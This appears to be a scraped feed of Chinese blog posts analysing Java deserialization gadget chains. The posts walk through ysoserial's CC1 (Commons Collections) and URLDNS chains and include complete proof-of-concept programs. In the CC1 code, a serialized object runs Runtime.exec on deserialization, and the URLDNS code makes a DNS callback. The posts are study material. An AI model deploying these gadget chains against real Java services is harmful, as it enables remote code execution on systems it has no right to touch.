Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); } } 最基本的链子大概如上，现在就是思考如何跳到LazyMap的get方法，结合前面的说法，现在就是要思考如何设置代理对象，结合动态代理的流程，在这里我们将Map接口类作为“中间”类，刚好“委托类”LazyMap是实现了Map接口的，所以是很合适的。\n然后理解一下ysoserial链，可以知晓在遍历Map(proxy)时会调用memberValues.entrySet方法，进而可以触发invoke方法。\n一步一步来，所以首先我们这里构造handler，\n1 InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); 然后调用Proxy的newProxyInstance()方法，用来创建一个代理对象，如下：\n1 2 3 //ysoerial链这里其实利用的是Map.class的构造器等，但是其实在最后的利用中差别不大，先跟这个 Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,outerMap); 这样就成功创建了一个代理对象，这是再看ysoserial，精妙的地方来了，如下代码：\n1 Object o = constructor1.newInstance(Retention.class,proxyMap); 然后再将这个o序列化并反序列化，当反序列化的时候，会对proxyMap调用entryMap()方法，此时就会到AnnotationInvocationHandler的invoke方法，然后一切都会往预期的方向发展。再将前面所有的代码结合起来稍微改改，就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 报错\n这是因为在设置代理对象时的第二个参数Map.class.getInterfaces()的Map.class并没有实现Map接口，动态代理没掌握好，照猫画虎了属于是，所以这里完全是多此一举了，我们就可以直接使用Map.class即可，而且本身Map就是一个接口类。\n所以最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 成功弹出计算机：\n——————\n思考 OK，现在就是解决前面遗留的问题。\n1.设置一个方法名称对应的键的实践，也就是加一个hashMap.put(\u0026quot;entrySet\u0026quot;,\u0026quot;xxxx\u0026quot;); 。最后的测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); hashMap.put(\u0026#34;entrySet\u0026#34;,\u0026#34;xxxx\u0026#34;);//here!!!! Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 最终并没有弹出计算机，想法正确。\n2,.创建代理对象时的方法参数问题，在我们想要利用的LazyMap链中，其实只要到了AnnotationInvocationHandler#invoke中，正确调用了get方法，那么对于后续的如正常代理中的会去到委托类一下都是无意义的，而且这里本身LazyMap就实现了Map接口，所以在创建代理对象的时候，可以像前面的POC那样构造，但其实使用LazyMap也是可以的，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //序列化 ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //反序列化 ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } 也成功弹出计算机：\nCC1的局限 在Java 8u71以后，官方修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject方法。\n改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。\n参考文章： （后面CC链都是跟过的，还有的不止CC链，可以多看看别人的博客，比如第一个人的就是，强推）\nhttps://su18.org/post/ysoserial-su18-2/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2\nhttps://xz.aliyun.com/t/10387?time__1311=Cqjx2Qi%3DomqGqGNDQieiKd7KF8DAhOi3RiD#toc-2\n当然nivia的博客： https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9\n","date":"2025-01-22T13:30:53+08:00","permalink":"https://fupanc-w1n.github.io/p/cc1/","title":"CC1"},{"content":"URLDNS URLDNS是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞，该利用链有如下特点：\nURLDNS 利用链只能发起DNS请求，并不能进行其他利用 不限制jdk版本，使用Java内置类，对第三方依赖没有要求 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞 可以在ysoserial项目源码里看到URLDNS利用链的源码，地址。也可以扒到本地来再在idea上调试。\nidea配置调试ysoserial 先直接在github上下载源码，然后再用idea打开这个项目即可，我用的JDK8，此时pom.xml会报错，此时就点击idea右边的m，如下：\n然后将里面所有的配置文件勾选，再点击左上角两个箭头旋转的标识即可。\n随后就不会再报错。\n此时我们再看pom.xml，来找项目的入口点（就是主类和main函数），如下：\n根据这个找到 src/main/java/ysoserial/GeneratePayload.java\n点击main函数左边的绿色箭头，点击调试，下面就只会打印usage，如下：\n这是因为没加任何参数，所以我们打开Debug Configurations：\n再在这里添加参数即可：\n我这里是添加的DNS，如下：\n然后在URLDNS的getObject()方法加一个断点，再在main函数点击调试就能正常获取值，如下： 可以看出已经正常获取到了值。同理如果想要使用其他诸如CC1之类的链子，就改为 CommomCollections1 'id' 即可。\n利用链分析 从主函数开始，在我传入参数后，来调试看一下\n可以看到此时payloadType的值为URLDNS，那么我们跟进一下getPayloadClass函数，\n可以看出这里使用反射调用了URLDNS类(反射需要注意包的问题)，即URLDNS对应的脚本的class对象并将其return。\n此时就可以看到 payloadClass 的值为 class ysoserial.payloads.URLDNS ，然后我们继续看后续代码，先是使用newInstance()实例化一个对象，然后再调用对象的getObject() 方法，即脚本URLDNS.java的getObject()方法，CTRL+鼠标左键继续跟进这个方法，可以发现定义的一个接口类，应该是URLDNS中重写了这个方法：\n然后继续调试，随后会进入到URLDNS类的getObject()方法，如下：\n这里可以看出URLDNS实现了ObjectPayload接口，在这里URLDNS类重写了 getObject() 方法并且此时的url即为我传进去的域名。\n先继续看main，在getObject()方法后，会调用serialize()方法，跟进看：\n可以看到就是在这里进行了序列化。\n现在继续分析URLDNS链，看URLDNS.java源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 package ysoserial.payloads; import java.io.IOException; import java.net.InetAddress; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.net.URL; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /** * A blog post with more details about this gadget chain is at the url below: * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ * * This was inspired by Philippe Arteau @h3xstream, who wrote a blog * posting describing how he modified the Java Commons Collections gadget * in ysoserial to open a URL. This takes the same idea, but eliminates * the dependency on Commons Collections and does a DNS lookup with just * standard JDK classes. * * The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). * * As part of deserialization, HashMap calls hashCode on each key that it * deserializes, so using a Java URL object as a serialized key allows * it to trigger a DNS lookup. * * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() * * */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 里面给了URLDNS的利用链：\n1 2 3 4 5 6 7 /** * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() */ 这里注意看URLDNS类的getObject方法，ysoserial会调用这个方法获得Payload。审这个方法的源码可以发现最后返回的是一个对象，而这个对象就是最后将被序列化的对象，在这里是HashMap。这里看一下利用的getObject()方法，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation---在创建有效负载时避免DNS解析 //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } 这个方法的作用是生成一个构造好了的HashMap对象，该HashMap的键是一个特定的URL对象。当我们在利用时，即HashMap被反序列化时，URL对象会被反序列化并触发DNS请求。 现在来分析一下这个getObject()方法。\n对于第一部分的实例化代码：\n1 URLStreamHandler handler = new SilentURLStreamHandler(); 其中的URLStreamHandler是一个抽象类，所以不能够被实例化，所以这里在URLDNS.java里创建了一个子类SilentURLStreamHandler，并重写了getHostAddress()方法和openConnection()，如下：\n1 2 3 4 5 6 7 8 9 10 11 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 那么这里为什么要重写这两个方法呢？对于openConnection()方法，应该是因为父类是抽象类并且子类不是抽象的，所以子类必须将接口方法实现。\n那么为什么要重写getHostAddress()方法呢，如果将这个重写的方法注释掉，那么当我们生成payload时，就会触发DNS请求，我们来看正常的 getHostAddress() 方法\n在这个getHostAddress()方法中，里面的**InetAddress.getByName(host)**方法会去发送请求，所以我们这里重写这个方法，这样在利用这个方法时，不会请求我们的hostAddress。\n还有一个重要的点就是在URL.java中，handler被transinet关键字修饰，在序列化对象的时候，handler属性不会被序列化。所以意味着重写的方法并不会带进我们的payload中，这样我们在触发反序列化漏洞时，getHostAddress并没有被重写，能够正常请求我们的网址。这也是我觉得很精妙的一个地方。\n（这里只需要了解，具体的请求过程看了后文就清楚了）\n现在来看第二部分，也是本篇文章最主要的部分：\n1 2 3 4 5 6 7 HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; 现在来看HashMap类，实现了Serializable接口，重写了readObject()方法\n在之前说过的反序列化的知识点那里可以知道触发反序列化的方法是readObject，并且因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，导致在这里可以构造利⽤链。\n现在就看一下HashMap类的readObject()方法，源代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 主要代码为：\n1 2 3 4 5 6 7 8 9 10 //读取键和值，并将映射放入HashMap中 for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } //跟进源码可以看出这里的readObject最终指向的就是ObjectInputStream类的readObject方法，即在这里反序列化，但是在这里只是HashMap类反序的其中一步。 理解一下代码，可以看出重点在\n1 putVal(hash(key), key, value, false, false); 这个方法的作用为为添加键值对到哈希表，这里先停一下，现在先来看URLDNS类里面使用的对应的HashMao类的put方法，如下：\n1 ht.put(u, url); 我们跟进一下这个put方法的源代码：\n1 2 3 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 可以看到这里的put的内容是差不多的，然后在getObject的put方法下断点，强制步入，可以看到如下结果：\n也就是前面反序列化相对应的代码。也就是说，我在HashMap对象中放进的键值对，在反序列化时其实也是调用的同样的代码来放入反序列化得到的HashMap对象中。\n然后继续看HashMap的readObject()中的putVal()方法，里面调用了hash()方法，跟进看一下：\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 简单来说就是判断key是否为null，为Null的话就返回0，否则将对key进行使用hashCode()方法后赋值给h并将这个h进行位移16位的异或操作，应该时甲酸哈希值的操作。\n重点就在于这个hashCode()方法，在ysoerial中我们人为地将key改为我们传入的java.net.URL对象，那么现在来看这个类的hashCode()方法：\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } //这里需要注意的就是在调用完hashCode()方法后，变量hashCode的值会被改变。 此时判断这个hashCode是否为为-1，并且在URL类中的hashCode值默认为-1\n这里值为-1，然后继续，当为-1的情况下的handler对象类型为：\n所以这里调用的就是URLStreamHandler类的hashCode()方法（这里强调对象与方法的所属关系，后面拉通来讲很有用），所以源代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //这个方法会发起请求并且计算hashCode的值，所以这里的hashCode会改变 protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; } u就是我们传入的url，在调用getHostAddress方法时，就会进行DNS查询，方法源代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 synchronized InetAddress getHostAddress() { if (hostAddress != null) { return hostAddress; } if (host == null || host.isEmpty()) { return null; } try { hostAddress = InetAddress.getByName(host); } catch (UnknownHostException | SecurityException ex) { return null; } return hostAddress; } 这里的InetAddress.getByName(host)的作用是根据主机名，获取其IP地址，在网络上其实就是一次DNS查询。\n大致完结，拉通一下，ysoserial链的序列化过程：\n使用自定义的URLDNS类的getObject()方法获取到payload，重点是getObject方法，下面来说一下方法的流程 （在这个方法中，在getObject()方法第一行我们定义了handler，并将其自定义的SilentURLStreamHandler类实例化赋值给handler。 在第二行我们实例化了一个HashMap类。 在第三行实例化了一个URL类，此时URL类中的handler对应的对象为我们自定义的SilentURLStreamHandler类并且注意我们在这个类中重写了getHostAddress()方法 在第四行使用了HashMap类的put方法，这个方法的源码在前面说过，本质差不多，大致为HashMap#putVal()-\u0026gt;HashMap#hash-\u0026gt;URL#hashCode-\u0026gt;handler对象#hashCode。注意，由于此时的handler为我们重写的类，所以最终会调用我们重写的getHostAddress()方法，但是此时会返回null，所以并不会发起请求。 在第五行我们本质上是调用了反射来更改hashCode的值为-1，这是因为我们在前面调用URL#HashCode时会将类里的hashCode改值，这样会导致URL类里面的hashCode值不为-1，所以需要反射改值，这样才能保证在URL类里的hashCode()方法能跳到URLStreamHandler类中。） 最终获取到这个payload后会将其序列化，我们只需要将其反序列化即可访问。 这里的流程也基本将前面讲的几个需要注意的点都说明了，这里就不多说了。\n反序过程：\n反序HashMap类，会调用HashMap类的readObject()方法，其实和前面都大差不差。 可以自己编写一个POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package java_foundation; import java.net.InetAddress; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.lang.reflect.Field; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap(); URLStreamHandler urlStream = new haha(); URL url = new URL(null,\u0026#34;https://rcpbxasvzr.yutu.eu.org\u0026#34;,urlStream); hashMap.put(url,\u0026#34;fupanc\u0026#34;); Field field = URL.class.getDeclaredField(\u0026#34;hashCode\u0026#34;); field.setAccessible(true); field.set(url,-1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } class haha extends URLStreamHandler{ protected URLConnection openConnection(URL u){ return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } 成功在DNSlog平台上有回显。\n参考文章：\nhttps://blog.csdn.net/qq_48201589/article/details/136049878\nhttps://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32xmrU1bKzte34D\u0026amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F\nhttps://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0\n","date":"2025-01-22T13:25:53+08:00","permalink":"https://fupanc-w1n.github.io/p/urldns/","title":"URLDNS"},{"content":"Java反序列化 在Java中，序列化过程分为两大部分：序列化和反序列化。\n序列化：将对象的状态转换为可存储或传输的格式的过程。例如，将对象转换为字节流或文本格式（如 JSON、XML 等）。这样可以将对象保存到文件、数据库或者通过网络传输。 反序列化：将序列化后的数据恢复为对象的过程。也就是说，将字节流或文本格式的数据重新转换为内存中的对象。 这两部分共同构成了序列化过程，确保对象可以被持久化存储或远程传输，并在需要时恢复原始的对象状态。\n如何实现 在Java中实现对象反序列化非常简单，实现java.io.Serializable（内部序列化）或java.io.Externalizable（外部序列化）接口即可被序列化。下面有几个点需要说明：\nSerializable 接口 源代码如下：\n1 2 public interface Serializable { } 一个对象想要被序列化，那么它的类就要实现此接口或者它的子接口。\n这个对象的所有属性（包括private属性和其引用的对象）都可以被序列化和反序列化来保存、传递。不想序列化的字段可以使用transient修饰。\n由于 Serializable 对象完全以它存储的二进制位为基础来构造，因此并不会调用任何构造函数，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。\n使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\n在这里还需要了解一个点，那就是static修饰的字段是绑定在类上的，而不是对象上。static优先于对象存在，所以static修饰的字段不会被序列化。\nExternalizable 接口 对于这个接口的使用可以参考最后面的参考文章。\n源代码如下：\n1 2 3 4 5 6 7 public interface Externalizable extends 